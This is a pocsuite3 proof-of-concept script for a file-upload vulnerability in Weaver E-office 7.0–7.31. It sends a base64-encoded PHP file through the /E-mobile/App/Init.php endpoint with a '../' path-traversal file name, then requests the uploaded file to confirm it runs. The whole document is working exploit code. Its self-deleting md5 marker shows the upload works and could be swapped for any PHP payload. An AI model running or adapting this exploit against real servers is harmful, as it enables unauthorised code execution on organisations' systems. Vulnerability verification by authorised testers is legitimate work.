from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 E-office /E-mobile/App/init.php 存在文件上传漏洞'
    appName = '泛微 E-office'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司的E-office /E-mobile/App/init.php 存在文件上传漏洞,攻击者可利用该漏洞获取系统敏感信息等。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers={
            'Referer':self.url
        }
        filename = 'testa123.php'
        path='/E-mobile/App/Init.php?m=createDo_Email&upload_file=PD9waHAgZWNobyBtZDUoMjMzKTt1bmxpbmsoX19GSUxFX18pPz4=&file_name=../'+filename
        vulur = self.url+path
        base_resp = requests.get(vulur,headers=headers,verify=False,allow_redirects=False,timeout=10)
        if  base_resp.status_code == 200 and '提交成功' in base_resp.text and '新建成功' in base_resp.text:
            tpath='/attachment/'+filename
            vulur1 = self.url+tpath
            base_resp = requests.get(vulur1,headers=headers,verify=False,allow_redirects=False,timeout=10)
            if base_resp.status_code == 200 and 'e165421110ba03099a1c0393373c5b43' in base_resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vulur
                result['VerifyInfo']['Content'] = vulur1
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
